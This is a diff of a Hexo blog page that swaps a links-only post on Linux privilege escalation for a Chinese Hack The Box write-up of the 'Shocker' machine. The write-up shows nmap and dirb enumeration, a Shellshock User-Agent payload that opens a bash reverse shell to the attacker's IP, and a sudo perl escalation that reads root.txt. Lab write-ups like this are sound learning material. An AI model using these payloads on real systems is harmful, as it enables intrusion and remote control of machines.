@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>linux提权一条龙 | Hexo</title>
-  <meta name="keywords" content=" linux提权 , nc升级为完整shell ">
-  <meta name="description" content="linux提权一条龙 | Hexo">
+  <title>htb之Shocker | Hexo</title>
+  <meta name="keywords" content=" htb , 博客 ">
+  <meta name="description" content="htb之Shocker | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="htb之Grandpa与Granny额这两台机子并称爷爷奶奶，真是一对夫妻，一模一样nmap 扫一下 10.10.10.14-15很好简单粗暴，只留一个端口，还是个80ii 6.0？嗯？谷歌一下直接开撸吧这哥们直接添加个模块？？？难道我大msf就没有这个漏洞模块？我深思一下，大感不妙，msf与外界隔离了吗？？这世道都变了吗，外星人要统治地球了？？于是我尝试search嗯～还是熟悉的配方，还是原来的">
 <meta name="keywords" content="htb,博客">
@@ -267,9 +267,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-linux提权一条龙" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之Shocker" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">linux提权一条龙</h1>
+        <h1 class="article-title">htb之Shocker</h1>
     
     <div class="article-meta">
         
@@ -277,23 +277,23 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="转载文章">转载文章</a>
+                <a href="javascript:" data-rel="渗透笔记">渗透笔记</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">linux提权</a>
+            <a href="javascript:" class="color4">htb</a>
             
-            <a href="javascript:" class="color3">nc升级为完整shell</a>
+            <a href="javascript:" class="color3">博客</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-15 17:37:10'>2019-10-15 17:28</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-17 11:20:49'>2019-10-17 10:42</time>
         
     </div>
     <div class="article-meta">
@@ -315,7 +315,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Shocker"><span class="toc-text">htb之Shocker</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -331,7 +331,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>linux提权脚本大全：<a href="https://www.freebuf.com/sectool/121847.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/121847.html</a><br>nc提升为完整shell：<a href="https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html" target="_blank" rel="noopener">https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html</a><br>反向壳备忘录：<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+        <h1 id="htb之Shocker"><a href="#htb之Shocker" class="headerlink" title="htb之Shocker"></a>htb之Shocker</h1><p>nmap 收集信息 10.10.10.56<br><img src="/images/1.1.png" alt><br>只暴露了80端口和2222端口<br>80登上去也就一张图片<br>目录搜索一波吧，找不到其他有用的信息<br><img src="/images/1.2.png" alt><br>该服务器正在使用CGI,再添加个目录/cgi-bin和扩展名.sh再跑跑看<br>dirb <a href="http://10.10.10.56/cgi-bin" target="_blank" rel="noopener">http://10.10.10.56/cgi-bin</a> -X .sh<br><img src="/images/1.3.png" alt><br>当找到cgi运行的脚本时，就可以shellshock获得shell，显然题目也提示了，再运行nmap测试验证一下</p>
+<blockquote>
+<p>nmap -sV -p 80 –script=http-shellshock.nse –script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56</p>
+</blockquote>
+<p>已经确定几本存在了，那就直接建立反向连接吧</p>
+<blockquote>
+<p>wget -qO- -U “() { :;}; echo Content-Type: text/html; echo; echo; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.2/4449 0&gt;&amp;1” <a href="http://10.10.10.56/cgi-bin/user.sh" target="_blank" rel="noopener">http://10.10.10.56/cgi-bin/user.sh</a></p>
+</blockquote>
+<p>通过sudo -l 可以看到perl可以动用root权限，那就可以直接查看root.txt</p>
+<blockquote>
+<p>sudo /usr/bin/perl -e ‘exec “cat /root/root.txt”‘</p>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -341,12 +352,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>linux提权一条龙</p>
+    <p><span class="copy-title">文章标题:</span>htb之Shocker</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-15, 17:28:17</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-15, 17:37:10</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/15/linux提权一条龙/" title="linux提权一条龙">https://manmachines.github.io/2019/10/15/linux提权一条龙/</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-17, 10:42:21</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-17, 11:20:49</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/17/htb之Shocker/" title="htb之Shocker">https://manmachines.github.io/2019/10/17/htb之Shocker/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
